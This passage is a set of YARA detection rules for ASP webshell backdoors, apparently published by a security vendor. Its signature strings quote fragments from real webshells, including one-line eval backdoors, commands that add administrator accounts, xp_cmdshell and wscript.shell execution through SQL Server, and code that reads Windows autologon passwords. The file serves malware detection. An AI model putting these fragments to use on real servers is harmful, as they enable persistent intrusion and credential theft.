        $s19 = "<a style=\"\"text-decoration:underline;font-weight:bold\"\" href=\"&URL&\"?ProFile=\"&pass2&\" target=_blank>" fullword ascii
        $s20 = "t:if request(\"cmdx\")=\"cmd.exe\" then" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_19dd7ba5aa278efb227e0546a3fc57c0cd686240
{
     meta:
        description = "asp - file 19dd7ba5aa278efb227e0546a3fc57c0cd686240.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "aa11845c454e30efb0ab157d3a107fad0b0803796dc838ab618ef7438b3befc7"
     strings:
        $s1 = "If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then" fullword ascii
        $s2 = "execute(UnEncode(hu))" fullword ascii
        $s3 = "a = a & Chr(Asc(Mid(temp, i, 1)))" fullword ascii
        $s4 = "pk=asc(mid(temp,i,1))-but" fullword ascii
        $s5 = "function UnEncode(temp)" fullword ascii
        $s6 = "if mid(temp,i,1)<> \"" fullword ascii
        $s7 = "for i = 1 to len(temp)" fullword ascii
        $s8 = "!Sftqpotf/xsjuf!#=ufyubsfb!obnf>dzgeebub!dpmt>91!spxt>21!xjeui>43?=0ufyubsfb?#!" fullword ascii
        $s9 = "!Tfu!pckGTP!>!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!" fullword ascii
        $s10 = "!Sftqpotf/xsjuf!tfswfs/nbqqbui)Sfrvftu/TfswfsWbsjbcmft)#TDSJQU`OBNF#**!" fullword ascii
        $s11 = "!Sftqpotf/Xsjuf!#=joqvu!uzqf>ufyu!obnf>tzgeqbui!xjeui>43!tj{f>61?#!" fullword ascii
        $s12 = "!Tfu!pckDpvouGjmf>pckGTP/DsfbufUfyuGjmf)sfrvftu)#tzgeqbui#*-Usvf*!" fullword ascii
        $s13 = "!sftqpotf/xsjuf!#=gpou!dpmps>sfe?tbwf!Tvddftt\"\"=0gpou?#!" fullword ascii
        $s14 = "!sftqpotf/xsjuf!#=gpou!dpmps>sfe?Tbwf!VoTvddftt\"\"=0gpou?#!" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them ) ) or ( all of them )
}

rule sig_1640b6a8c0f4cb182ebe14b2ee199c55a163d7ef
{
     meta:
        description = "asp - file 1640b6a8c0f4cb182ebe14b2ee199c55a163d7ef.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c83ae2f8b285bfd9f0aa4d40508b758cfae713e251234c9c18cf1d143d5e8764"
     strings:
        $x1 = "olor=ont ctd><f/td><~ute<xec~&ver.Ed>Sertd><tp&~</~&tem><td>&~<treportt = RRepor>~` Sun Sun =+ 1`End If`othins = NatcheSet Mg`= " ascii
        $x2 = "-temp=~`End If`= NotegEx Set rhing` RegE= NewegEx Set rxp`e = TreCas.IgnoregExrue`al = .GlobregExTrue`*~~.*s*=\\sfile\\de\\s*inc" ascii
        $x3 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x4 = "RRS\"<tr><td height='20'><a href='http://www.aspmuma.cn/sqlrootkit.asp' target='FileFrame'>" fullword ascii
        $x5 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s7 = "RRS\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s8 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><img src='http://www.t00ls.net/templa" ascii
        $s9 = "case \"apjdel\":apjdel():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD\":MMD():Case \"adminab\":adminab(" ascii
        $s10 = "RRS\"<tr><td height='20'><a href='http://www.aspmuma.cn/' target='FileFrame'>" fullword ascii
        $s11 = "Objec~&~te>Cread><tdct</teObjeat~&~d>Cretd><tp&~</~&tem><td>&~<treportt = RReportr>~` Sun Sun =+ 1`exit sub`End If`Next`othins =" ascii
        $s12 = "\\s*# ~<!-ern =.PattregEx~~~`letxtte(fiExecuegEx.s = ratcheSet M)`tchesin Maatch ach MFor E`,~\\~)),~/~) - 1 ~~~~alue,tch.Vtr(Ma" ascii
        $s13 = "RRS\"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>" fullword ascii
        $s14 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s15 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s16 = "RRS\"<tr><td height='20'><a href='?Action=Logout' target='_top'>" fullword ascii
        $s17 = "~%23 ~#~,temp,lace(= Reptemp ~)` ~%26 ~&~,temp,lace(= Reptemp ~)` = tencodetURLEmp`unctiEnd Fon`2(PatlFilehowAlSub Sh)`Objecyst" fullword ascii
        $s18 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s19 = "RRS\"<tr><td height='20'><a href='?Action=getTerminalInfo' target='FileFrame'>" fullword ascii
        $s20 = "RRS\"<tr><td height='20'><a href='?Action=DbManager' target='FileFrame'>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a62df85582f4b9c65441527d3ab08d96e6657972
{
     meta:
        description = "asp - file a62df85582f4b9c65441527d3ab08d96e6657972.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d239a3424a99d3a3312be8fc65e11d09434998673b896e94d75143692bc38ed8"
     strings:
        $s1 = "<%ExecuteGlobal request(" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_5a912a6c89e7ef0fe8cf2f5b909bf9a38d61f9ba
{
     meta:
        description = "asp - file 5a912a6c89e7ef0fe8cf2f5b909bf9a38d61f9ba.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5360da3bf0e38b66eceaff357d42b37db88b3fbc34219c2cdb4d396c38a73e6e"
     strings:
        $s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\") " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d8b0fa1a4acdeadd01eedf47ad004880326f6765
{
     meta:
        description = "asp - file d8b0fa1a4acdeadd01eedf47ad004880326f6765.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1ddff2ea9477bf9d801666dc2ab9a3a4877390017a524d08627d851533a82a45"
     strings:
        $s1 = "<%eval\"\"&(\"eval(request(120-2-5))\")%> " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3ae33c835e7ea6d9df74fe99fcf1e2fb9490c978
{
     meta:
        description = "asp - file 3ae33c835e7ea6d9df74fe99fcf1e2fb9490c978.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5406d524d2e51ea6d0f9afa5e21e07e3b000185fdc4c1dec88f999ff5e1fd7f5"
     strings:
        $s1 = "WWJ@!JezL5~'zCz@* y +owa'MGVKmPDUG0@!@*9lnC$P{/dl^^PGK@!~JezG41+we'&Cz@*(,O0%9a{.W^W^o(P]P@!@*NZ{N8,a{.GVKmT4~!x." fullword ascii
        $s2 = "&Cz&eJ~{T+8$MY?pzC&zCzj?zn~HtjS}/PhrIG~D+slg+s4CP]P3S~)K,I3PdbzM&Je&P{D8F,MYUizCzJMz* f`\"bu/\"b.,j?znPg\\iS}Z,f9b~D" fullword ascii
        $s3 = "m4Gr@!YM@*@!DNP4nro4Y{B+!v@*@!l~tMn0{B%C7l/^.bwO)U4KhoKV9+DvJrE[\"+KlDtc]KWYhCY4#[rEE#E@*r[Wl^nvJW0RT!ZJSTBJ%EbLJ" fullword ascii
        $s4 = "V8Ckkf |PLP0d./47PLP|'nsbsd+tUkTWJR#P[~WdD/47~LP|'-=m'MkGn:KCR=id77iU{,'P6SD;8-PLP#NG'[.Khd/mKO#P'~6SD/87P'P#GT'." fullword ascii
        $s5 = "mE'xTk^CPMY@!@*MY&@!@*NYJ@!@*E!*Exnyb/,B[NC&,^.+0^l4Pd.KYl.OkkUks[mP2!WMoVmmKsPD+UPLP[[mzPMn31lt,y.+0mmt~Dnd!PO+" fullword ascii
        $s6 = "{dK0DuEa0bs+|w4WDWk;a0k^n{kW0D2rm-\\bwk*TX*- `4O:-tOh^uld2-w4w-%kwkm/a6u1obkLk#w4r~CLM#P@#@&q6PD" fullword ascii
        $s7 = "@*9nD{DGsKmPOUK0@!@*GP~Kxk/mVm,ND@!@*9Y&@!RAo)R%AW+cR,Oy*)% AR&*O|'D/nAH\\WG[|)ZGfRXGf* ;+F)[b/^mP" fullword ascii
        $s8 = "s(lOJ@!@*DYJ@!@*[YJ@!@* {Y4Lb+t,[Y@!@*DD@!@*DDz@!zMz'(U'(?,~P,-MwD6+H~,-M-JMJ@*.D@!@*DYJ@!JMzLqj'&?~U" fullword ascii
        $s9 = "NGmUnc#Owb.mkl-CNuY2rMmdL-Oak.1/(\\`C/'_T#=,ek-xMk-2V)jV1bd8w=,',x.+OOmn 6AL+Md77?+E.P,'~Vm8KV!c6Ao+Mdi7U" fullword ascii
        $s10 = ";/9VWT&|PLPDDGw~',=lFcTRZR{+8zzl2DY4=,S#K3V=,x+aWc^did7U*=KP:CStpRD0WkG.mbH#`Omn%(rnYmnD;R.n7D+jx1PO+k7id7?x" fullword ascii
        $s11 = "tY,&,xP8xGkDmC~6k+ks+idd?|@*YakMmdz@!|Kt^+i7d?=IbZ!!*S#=I#vOb:8!/cxEkN^GocVslcYUnsEmK[=#`Y!Gn:bKD+d=G41+7di==p#v@*M+YUn1@!SRc " fullword ascii
        $s12 = "2)JM&sAsAs3a&MJ'.W^GmTAlnkV2l&CzXslols:JeJ'DKVK^o~)U+4K~&CzsAo2w2aJM&'MW^W^o$~6q~P,~P,P~wC-FRHwPGK,T{k~MWwPPi-CwP,zMz@*NO&@!@*Y" fullword ascii
        $s13 = "Rc cR cRcRRcRc RcR RcR  cRRc|PLP:!HODKw,[~=l|,[~wbO+TDCOL=@*~+{xCwUsKm~GK~K'k/msm,NO@!@*DO@!#`W4^+iddi=U+4K,!~@*~b#Rb#vOm" fullword ascii
        $s14 = "\\M+jP'~#'nmM;WUPCOmfPITcc AG3dr D+xRY6WkGD1k\\'M+[r7WDh|P{PDDjUxKm?#|oGsmYCZcprGb|cDm+%8}+Ol" fullword ascii
        $s15 = "~Wl1+vZGVG.B?ryB#lM#l\\KD0r/KNn'r&Cz@*:1}sz@!zC&[Ml#[Je&@*JezL\"kU[zC&~BJeJ[.WsG;[&eJ:B{DGsKmPdL" fullword ascii
        $s16 = ":Cx.nkES=Mn/!=cnDl+./c4G'9G,YnUU*=w!WML~kDGYmDOdbxks[bJ=[.GcY1+N46Yn!{+GPDn??#\"GvYmn%(rO+Vx(W~D+UU+slg.+DE2:KZ 2^[=J&):1xb" fullword ascii
        $s17 = "hCx,Ba/CRan9xrzsGmc%fqakRAASz&)aODtv{xKkY1l,O/KwxNKtOnsP:MG0@!zeJ'(?{qUP~-MwJe&@*MOz@!@*[OJ@!zM&L#&eJ3tbH|IA.IA?JMzv/nV(lr.m.D" fullword ascii
        $s18 = "@*Bwsswsw:B{DGVKmL8,B!Z+B{tY9rAPE!yBxY4Lb+4P9O@!@*B.nDx+^v{xLk^C,DO@!@*E3xmV(mB{YnoMlO~E:DKWwbB'" fullword ascii
        $s19 = "+9[k4Bx+aXO~EEB{n:mxPD;2xb@!@*BUEd[^WLB{n:mx~vD/W2v{NGtDnsPhMW6@!=Kt1ndid=+T3~G4m+i7d?l'*|C=vxKkd/nd,Yn/i7diUOr!;P'~M+dESn" fullword ascii
        $s20 = "'JJeJ@*+^4CYJ@!@*.Dz@!@*[YJ@!zC&Gt1+'ewzM&@*+hlMWkJ@!@*vk+XvxTxrV^GMmd,ByB'M+9.W(+hlM0~vu!!8v'Dtobn4PE]Z!qBx4DNrh,v+^koqSWtjx" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_700050e57f4dccb0b2fea4501d2f6446c28483ca
{
     meta:
        description = "asp - file 700050e57f4dccb0b2fea4501d2f6446c28483ca.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b2f77aa399d30d9e843f4116e3595bd686c35bedc7e0d163ba58d718bfd9f1db"
     strings:
        $s1 = "UYEP^G^/'q+ZP.WSd{ T@*J@#@&dxPknD7+.R_K\\JAxmK[+vI+m[ok^+v0rVnUm:n#*@#@&i9E@!JY+aOmDnl@*@!JNr7@*r@#@&i9,E@!9k-PkYzs" fullword ascii
        $s2 = "O/BPr~,Fb@#@&@#@&7CDz/m,x~bkmv.CD/4mDb@#@&@#@&&0~-mDbd^,@!~!,P4+U,\\mDbkm,xP7l.bkm~Q,v*lfv@#@&@#@&(WP7lMbdm~@*, X*,Pt" fullword ascii
        $s3 = "a`z/mv^b#B *P@#@&rubo4P{]kTtOc_+6c)kmcm*bB b,@#@&YW~XDnP{POW~XOn,[P14D~`JLuE[bSKhbP'~1t.AvE[_J'r_ko4b,@#@&2^d" fullword ascii
        $s4 = "hw{/O+sw'/4D`zdmq`Z4.$`z/1AcE2WbVn{la?K0OmUYDnCsR]+m[vFb*#LZtMAv^#*#~@#@&kxr3FP@#@&+^/+,@#@&/D+swx/Onsw'Z4.`1#~@#@&2x[~&0~@#@&H" fullword ascii
        $s5 = "UqP{Pd+UAcCkZGxDnxD/b@#@&@#@&(W,Vnx8~@!Pq,K4+x@#@&@#@&Am/nvW+U^KN+,xPrJ@#@&@#@&2XkDPoEU^DkGx@#@&@#@&2U[,q0@#@&@#@&\\c,x,Vn" fullword ascii
        $s6 = "[~s!x1YrWU@#@&@#@&s!UmDkGU,fEh2UkO+vb@#@&7M+D\\l^'rE@#@&ddkD+.GKY'UnD7+Dc\\CwhlDtcJ&E*@#@&dknY,W8%6/Wxd" fullword ascii
        $s7 = "@!Jl@*@!&[b\\@*J@#@&dxJ@!4M@*J@#@&i9~J@![b\\~kYHV+{B4nkTtO)yc2apPVbU+ t+bL4Y= Wwai~2mN[k" fullword ascii
        $s8 = "@!&ON@*J,P~P~~,P~P,~PEg_~,P@#@&7xPE@!D[@*J'K4N0k^+bO+sRdk.+'E0@!zD[@*rPP,~~P,P,P~B__Qg~P,@#@&i9~E@!YN@*ELW8L6r^+rD+sRNmY" fullword ascii
        $s9 = "U@#@&d7E{JCu\"!mGG\\d&N2[z*amG5\"r/XN4+!7^ gXCp~!S+o.m/*Zn_pxr@#@&ddk'TnY4YOwalLnv4lknvWN+1G[+vE*[EgOxr[UWSc#*@#@&7imWUO" fullword ascii
        $s10 = "NPw;x1YkKU@#@&@#@&wEUmOrKx~SKLW!Ycb@#@&d]nkwGxkncZGK3b+/vJ4C/|VGobxEb{J!r@#@&iI+k2Gxk+cssEd4v#@#@&iBJ@!tOh^@*@!4nmN@*@!J4" fullword ascii
        $s11 = "'!~GMPok^nUYCMY{!PKD,ok^+Hls+xErPY4nx,+6bO~0!x1YrWU~@#@&r0,ok^+jOmDYxT,W.PMrTtOv0!VValD4~8#xJJJ~O4+x,n6bYP6;UmDkKx~@#@&d" fullword ascii
        $s12 = "N,jE(P@#@&@#@&K;(Vk1~0!xmDrGx,?m\\nbdcwEsVhCY4#~@#@&Nkh~9DS2M.KD/4lM~k,@#@&jl7+)/{F~@#@&k0,ODb:`6;sValDtb'EE,W.PwrV" fullword ascii
        $s13 = "3@*@!ksoP(WM[+M'TPkD^xEtYD2)JzhSA Vbx0tnV2nMR^xJL+Dw. m/w_5!+.X!.^'ELtK/YLJLdtKhx&E@*@!&m@*@!bho,/YHsn'ENb/2VCz=xGx" fullword ascii
        $s14 = "x@#@&@#@&\\C._+aP{~_+av\\mDbkm*@#@&@#@&-lMVGA,'Pdn0D`\\m.u+X~, b@#@&@#@&\\CD4ro4Px~\"ko4Ov\\CD_nX~~y#@#@&@#@&/D.j" fullword ascii
        $s15 = "(l^3L.KE2)[E[(o^G^WD'E)@!&/Dz^+@*@!z4+l9@*r@#@&idBJ@!4G[H@*J@#@&di9J@![r\\,/DXs+xv4+ro4O)l!2aphk[O4'+!Z2XiO" fullword ascii
        $s16 = "UP@#@&rUUYDrUT'TP@#@&A6rDP6WD,@#@&nx9Pr0,@#@&r6Pbk^AvEw6rs+|*X?G0OmUY.+mhR\"+C[vF#b@!@*bdm~ctk[~`UYDBLBq#*POt" fullword ascii
        $s17 = ".E@*@!D+XYlM+m~DKhd'y*~^KV/{q Z@*@!JOn6DlM+C@*@!&9k-@*r@#@&i+U[,k0@#@&i9E@!J[b\\@*@!z(WNH@*@!&tD:s@*r@#@&3" fullword ascii
        $s18 = "xls+@#@&dk+OPK4%WkW'1.+mY+K8%+1YvJdm.raYrxT 0bVndH/YnhK4%+1Or#~,P@#@&dk+D~W(LWk^+xG(L0kGRV+Ywrs+v0bVnxCh" fullword ascii
        $s19 = "l.XB~FBPqb*)PjC7+$kDd8Px,AHY+8PzUN,&@#@&@#@&$zD+ ,xPz/m~c\\k9AvVdM.G!w$k" fullword ascii
        $s20 = "x8@#@&@#@&9b:~k@#@&@#@&frh,.l./4l.@#@&@#@&frsP7lDz/1@#@&@#@&9ksP-CMC+XSP7lD^GA~,\\mD4kL4@#@&@#@&kOD`xr^KN++)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule sig_846aef1ca6de2c8f245bd88bd1797bea30b24220
{
     meta:
        description = "asp - file 846aef1ca6de2c8f245bd88bd1797bea30b24220.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "13cafa79c22ea24c1b9b8c24e69a092ccc78c2b258b98c6d432d99b5006c54f4"
     strings:
        $s1 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>" fullword ascii
     condition:
        ( uint16(0) == 0x533c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_7b5f68c74725ef9ecfb5032bb159f932fbf881eb
{
     meta:
        description = "asp - file 7b5f68c74725ef9ecfb5032bb159f932fbf881eb.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1632e302d8a0cfe70e7cc75c725fd6d2c0ec0fd7220d6b4655f3e10c3bd8bf6a"
     strings:
        $s1 = "If Session(\"lcxMarcos\")<>\"\" Then Execute(Session(\"lcxMarcos\"))" fullword ascii
        $s2 = "If Request(\"111111\")<>\"\" Then Session(\"lcxMarcos\")=Request(\"111111\")" fullword ascii
        $s3 = "<script language=\"vbscript\" runat=\"server\">" fullword ascii
     condition:
        ( uint16(0) == 0x733c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule f6aeb1f10bb1c198a7c6e378d4d3b9170f480a4c
{
     meta:
        description = "asp - file f6aeb1f10bb1c198a7c6e378d4d3b9170f480a4c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "352465776c8ae0a89380e3c4455970217be5e7ac8289376d9c8d75bb54d6f2c2"
     strings:
        $s1 = "<!-- yes++ -->" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_27b75e17a69fc3fa2f07d8f5ee9258fc92af4030
{
     meta:
        description = "asp - file 27b75e17a69fc3fa2f07d8f5ee9258fc92af4030.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a828153a8ec75ebeec010bd9e0fa5873b9c2602c0caa393a115075a16d74d0ab"
     strings:
        $x1 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"\"&dbname&\"..dark_temp\"\" in \"\"\"&loadpath&\"\"\" -T -f c:\\tmp.fmt'\")" fullword ascii
        $x2 = "Const strs_toTransform=\"command|Radmin|NTAuThenabled|FilterIp|IISSample|PageCounter|PermissionChecker|BrowserType|ContentRotato" ascii
        $x3 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
        $x4 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"select binfile from \"&dbname&\"..dark_temp\"\" queryout \"\"\"&thePath&\"\"\" -" ascii
        $x5 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
        $x6 = "conn.execute(\"exec master..xp_cmdshell'bcp \"\"select binfile from \"&dbname&\"..dark_temp\"\" queryout \"\"\"&thePath&\"\"\" -" ascii
        $x7 = "If getInc=1 Then strInclude=regExecute(content,\"<!--\\s*#include\\s+(file|virtual)\\s*=\\s*.*-->\",False)(0)" fullword ascii
        $x8 = "doTdInput\"text\",\"fsoori\",\"C:\\WINDOWS\\system32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x9 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
        $x10 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
        $x11 = "C:\\windows\\temp\\~098611.tmp','\"&getLeft(cabtag,\"\\\",False)&\"',1,'\"&getRight(cabtag,\"\\\")&\"'\"" fullword ascii
        $x12 = "conn.execute(\"EXEC master..xp_cmdshell 'echo \"&substrfrm&\" >>c:\\tmp.fmt'\")" fullword ascii
        $x13 = "doTextarea\"logContent\",\"<%response.clear:execute request(\"\"value\"\"):response.End%\"&\">\",\"100%\",5,\"\"" fullword ascii
        $x14 = "form2.queryStr.value=\"backup database \"&dbname&\" to disk='C:\\windows\\temp\\~098611.tmp' with init\"" fullword ascii
        $x15 = "doTdInput\"text\",\"cabori\",\"C:\\WINDOWS\\system32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x16 = "form2.queryStr.value=\"insert dark_temp values('\"&Replace(logcontent,\"'\",\"''\")&\"')\"" fullword ascii
        $x17 = "conn.execute(\"EXECUTE master..xp_cmdshell 'del c:\\tmp.fmt'\")" fullword ascii
        $x18 = "form2.queryStr.value=\"alter database \"&dbname&\" Set recovery full;dump transaction \"&dbname&\" with no_log;If object_id('dar" ascii
        $x19 = "Set matchColl=regex.Execute(tempFileData)" fullword ascii
        $x20 = "doScanReport objFile,\"Found <font color=\"\"red\"\">Server.Execute / Transfer()</font> Function\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 400KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule sig_83e7685438f1554c390a50ed65912b44e80b46f6
{
     meta:
        description = "asp - file 83e7685438f1554c390a50ed65912b44e80b46f6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "792e70ee1d2af280815efe43b5937e4f2826a15af9726a6ca8593a43e9bb1c74"
     strings:
        $x1 = "<option value=\"\"Declare @s  i;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execu" ascii
        $x2 = "<option value=\"\"Declare @s  i;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execu" ascii
        $x3 = "<option value=\"\"dbcc addextendedproc ('xp_cmdshell','xplog70.dll')\"\">" fullword ascii
        $x4 = "\"<option value=\"\"Exec XP_CMDShell 'net user lcx lcx /add'\"\">XP_CMDShell" fullword ascii
        $s5 = "autoLoginPath=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"" fullword ascii
        $s6 = "cmdStr=\"c:\\progra~1\\WinRAR\\Rar.exe a \"\"\"&cmdStr&\"\\Packet.rar\"\" \"\"\"&cmdStr&\"\"\"\" '" fullword ascii
        $s7 = "<option value='sql:Driver={MySql};Server=127.0.0.1;Port=3306;Database=DbName;UId=root;Pwd=***;'>MySQL Server" fullword ascii
        $s8 = "If appName=\"\" Then appName=\"cmd.exe\"" fullword ascii
        $s9 = "O \"formp.G.value='\"&G&\"';\"&Y(G=s,\"formp.G.value='PageExecute';formp.submit();\",\"\")&\"}\"" fullword ascii
        $s10 = "'Response.Write(\"A.ShellExecute \"&appName&\",\"&appArgs&\",\"&appPath&\",\"\"\"\",0\")" fullword ascii
        $s11 = "doWsCmdRun=W.Exec(cmdStr).StdOut.ReadAll()" fullword ascii
        $s12 = "<form method=post onSubmit='this.Submit.disabled=true'><input type=hidden name=G value='PageWsCmdRun' />" fullword ascii
        $s13 = "cmdPath=\"cmd.exe\"" fullword ascii
        $s14 = "If LCase(appName)=\"cmd.exe\" And appArgs<>\"\" Then" fullword ascii
        $s15 = "If LCase(appName)=\"cmd.exe\" And appArgs=\"\" Then" fullword ascii
        $s16 = "Response.AddHeader \"Content-Disposition\",\"Attachment;Filename=\"&R(\"param\")" fullword ascii
        $s17 = "<option value=\"\"sp_makewebtask @outputfile='d:\\bbs\\cd.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\"&Ch" ascii
        $s18 = "Dim isAutoLoginEnable,autoLoginEnableKey,autoLoginUsername,autoLoginPassword" fullword ascii
        $s19 = "<option value=\"\"sp_makewebtask @outputfile='d:\\bbs\\cd.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\"&Ch" ascii
        $s20 = "autoLoginPassKey=\"DefaultPassword\"" fullword ascii
     condition:
        ( uint16(0) == 0xdbcd and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule eca64bf88037d51125b581b389f9d6c0871e9313
{
     meta:
        description = "asp - file eca64bf88037d51125b581b389f9d6c0871e9313.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "71e16a63d477c4a988845f61f3d900cce998c5389cff4c5ffa0accc24fa3cd04"
     strings:
        $s1 = "v@*,~JLS Hm:+'E@!zC@*@!P9Pr9'9@*JLm^UovS /byn&8! Wb[r|@!JO[@*@!K9PrNx[@*J'ScPXa+'E@!zY[@*@!K[Pb[{N@*r@#@&/k{/b'J@!l~tM+WxrJJLGw" fullword ascii
        $s2 = "m~J,'P1:[~LP\\8/MSWPL~$ErD@#@&/+DPkn/kkGxvJ8E*'4@#@&Lr@!0K.hPs+DtGNxvaWdYE~xm:nxEoWs[kEUB@*E@#@&%r@!bxw!Y,Uls+xB!B~OHw+{vtbNN" fullword ascii
        $s3 = "0@#@&@#@&@#@&NJ@!4.@*@!YD@*@!ON@*@!bx2EO~Kx\\W!d+}\\n.{JJO4b/ /Dz^+ 1EM/WM'E4l" fullword ascii
        $s4 = "0'E%l7l/1.rwD)wEsVoGM:cJrE[\"+KCDt`KCDt'J'ELs gls+#LJrE~rJ/WaXoG^N+MEJ*BP,GUm^k13xB.nDE.x,z+kWVc*BP^sm/d'ECsB~DkDV+{B" fullword ascii
        $s5 = "O+MbDMCz`b#*#xF~P4+UP@#@&/DD68NP'~dDD64N~LPEZJLZ?DDvu+X`KlMlhnD+Dz.DmX`bbb#@#@&AVd+@#@&kY.r(%P{PdOMr4%~LPu+Xchl.m:" fullword ascii
        $s6 = "P@#@&,PP,ok^+q1GxJ@!0KxOPWC1+xBSrxTNrUT/B~^KVGD{v[N[9N9NB,/b\"+{BfB@* @!&6WxD@*Pr@#@&,~3x9P&0@#@&3U9PoE" fullword ascii
        $s7 = "htp=\"http://www.baidu.com/\"'" fullword ascii
        $s8 = "~~kBPqb,'PrWJ,rD,\\rNv/DDrxS~b~~F*~'rsE~:t+U~@#@&%P{~8*~@#@&AxN,q6~@#@&qWPtk[ckYDbU~,k~,qbP{Pr+EP6.,HrNvdYMkUS,k~~q*PxPr3rPP4+" fullword ascii
        $s9 = "rTtO{By!B,k9xN,WUHKEdn}\\+MxJrYtbd /DX^+ 4C^0o.W!UN;WsGM'B:" fullword ascii
        $s10 = "@!z(@*@!&DN@*@!O9PrN{d,tnbo4Y'y @*@!4,k['X@*jr.+@!J8@*@!zY9@*@!Y9PbNx/@*@!(PrN{a@*:X2n@!z4@*@!JY[@*@!O9Pr9'k@*@!(Pb['X@*6w" fullword ascii
        $s11 = "qh@!&O9@*@!O[,4LmKsKDxEawsswswv@*,@!&Y9@*@!O9P4T^W^WD{v:swswsoB@*@!bx2ED~YHwnxEY+aOEPUlsn{BraB,/k.+{vFlB~\\mV;n{BJL]+$E+kO ?" fullword ascii
        $s12 = "PJV2:E~,J4YDwl&JF F !c!R8lEPLPaW.Y~',J&oKsNkEU&!wl[hbx&/8EBK.!+BPJr~,EJ@#@&CRk+U[,VWTrx!/+M~'P^WTkUwCdkP'PsOPLP[n^NWhCbx~[,U" fullword ascii
